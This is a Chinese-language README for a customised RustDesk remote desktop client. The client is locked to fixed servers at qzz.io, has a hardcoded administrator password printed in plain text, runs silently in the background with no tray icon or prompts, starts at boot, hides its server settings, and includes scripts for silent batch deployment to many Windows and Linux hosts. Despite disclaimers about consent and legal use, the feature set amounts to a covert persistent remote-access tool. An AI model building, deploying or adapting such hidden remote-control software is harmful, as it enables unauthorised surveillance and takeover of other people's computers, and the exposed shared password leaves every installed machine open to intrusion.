# RustDesk 自定义客户端

这是一个定制化的 RustDesk 远程桌面客户端，专为家庭/个人设备管理场景优化。

## 🎯 定制化特性

### 1. 预配置服务器
- **ID Server（Rendezvous Server）**: rdapi.qzz.io
- **Relay Server**: rustdesk.qzz.io
- **管理员密码**: ljhcch791115（内置硬编码）

### 2. 静默后台运行
- 默认后台服务运行，无托盘图标
- 无弹窗提示
- 开机自动启动（Windows/Linux 服务）

### 3. 安全锁定
- 服务器地址锁定，用户无法修改
- 管理员密码固化在程序中
- 隐藏服务器设置界面

### 4. GUI 唤醒方式
- **命令行参数**: `rustdesk.exe --gui` 或 `rustdesk --gui`
- **用途**: 当需要查看或修改本地设置时使用

---

## 🚀 快速开始

### Windows 部署

#### 单机安装
```powershell
# 下载安装包
# 方式1：从 GitHub Releases 下载

# 方式2：本地构建
python build.py --flutter --release

# 运行安装程序（静默安装）
.\rustdesk-setup.exe /VERYSILENT /SUPPRESSMSGBOXES
```

#### 批量部署（多台电脑）
```powershell
# 管理员权限运行 PowerShell
.\deploy_windows.ps1

# 或者指定远程主机
.\deploy_windows.ps1 -ComputerName "PC1","PC2","PC3"
```

### Linux 部署

#### 单机安装
```bash
# Debian/Ubuntu
sudo dpkg -i rustdesk-x86_64.deb

# RedHat/CentOS
sudo rpm -ivh rustdesk-x86_64.rpm

# 启用并启动服务
sudo systemctl enable rustdesk
sudo systemctl start rustdesk
```

#### 批量部署（多台服务器）
```bash
# 本地安装
sudo ./deploy_linux.sh

# 远程批量部署（需要配置 SSH 免密登录）
sudo ./deploy_linux.sh host1 host2 host3
```

---

## 🛠️ 使用说明

### 查看客户端 ID
```bash
# Windows
rustdesk.exe --gui

# Linux
rustdesk --gui

# 然后在主界面查看 "您的桌面ID"
```

### 服务管理

#### Windows
```powershell
# 查看服务状态
Get-Service RustDesk

# 重启服务
Restart-Service RustDesk

# 停止服务
Stop-Service RustDesk
```

#### Linux
```bash
# 查看服务状态
systemctl status rustdesk

# 重启服务
sudo systemctl restart rustdesk

# 查看日志
journalctl -u rustdesk -f
```

---

## 📦 构建说明

### 前置要求

#### Windows
- Rust 1.75+
- Flutter 3.24.5
- Visual Studio 2022（含 C++ 工作负载）
- vcpkg
- Python 3

#### Linux
- Rust 1.75+
- Flutter 3.24.5
- 构建工具：gcc, cmake, git
- 依赖库：libgtk-3-dev, libasound2-dev, 等

### 本地构建

```bash
# 克隆代码
git clone <your-repo-url>
cd rustdesk

# Windows
python build.py --flutter --release

# Linux
python3 build.py --flutter --release
```

### GitHub Actions 自动构建

推送代码到 GitHub 后，Actions 会自动构建：
1. Windows x64 安装包
2. Linux DEB/RPM 包

构建产物会自动上传到 GitHub Releases。

---

## 🔧 配置说明

### 硬编码配置位置

配置已在源代码中硬编码：

1. **服务器地址**: `libs/hbb_common/src/config.rs:109`
2. **密码和设置**: `src/common.rs:124-163`
3. **GUI 参数**: `src/core_main.rs:77-79`

### 自定义修改

如果需要修改配置，请编辑以下文件后重新编译：

```rust
// libs/hbb_common/src/config.rs
pub const RENDEZVOUS_SERVERS: &[&str] = &["rdapi.qzz.io"];

// src/common.rs
fn init_custom_config() {
    // ...
    hard_settings.insert("password".to_string(), "ljhcch791115".to_string());
    overwrite_settings.insert("relay-server".to_string(), "rustdesk.qzz.io".to_string());
    // ...
}
```

---

## 📋 功能对比

| 功能 | 官方版 | 定制版 |
|------|--------|--------|
| 服务器地址 | 可修改 | 锁定（rdapi.qzz.io） |
| Relay 地址 | 可修改 | 锁定（rustdesk.qzz.io） |
| 管理员密码 | 用户设置 | 内置硬编码 |
| 启动方式 | 托盘图标 | 后台静默 |
| GUI 访问 | 双击启动 | --gui 参数 |
| 设置修改 | 完全开放 | 服务器设置锁定 |

---

## ⚠️ 重要说明

### 使用场景
本定制版本适用于：
- ✅ 个人/家庭设备管理
- ✅ 用户完全知情并同意安装
- ✅ 合法的远程技术支持

### 安全提示
- ⚠️ 密码已硬编码在程序中，请确保只在可信环境使用
- ⚠️ 建议在部署后定期更新版本以修复潜在安全漏洞
- ⚠️ 确保自建服务器的安全性

### 法律合规
- 仅在获得设备所有者明确授权的情况下使用
- 遵守当地法律法规
- 不得用于未经授权的访问或监控

---

## 🔄 更新日志

### v1.0.0 (初始版本)
- ✅ 内置服务器地址配置
- ✅ 硬编码管理员密码
- ✅ 后台静默启动
- ✅ --gui 参数支持
- ✅ 设置锁定功能
- ✅ Windows/Linux 批量部署脚本
- ✅ GitHub Actions 自动构建

---

## 📞 技术支持

如有问题，请检查：
1. 服务器 rdapi.qzz.io 和 rustdesk.qzz.io 是否正常运行
2. 防火墙是否允许 21116-21119 端口
3. 客户端日志文件

---

## 📜 许可证

本项目基于 RustDesk 开源项目修改，遵循 GPL-3.0 许可证。

原项目地址：https://github.com/rustdesk/rustdesk

---

**⚠️ 声明：本定制版本仅供学习和合法用途，禁止用于任何非法活动。**
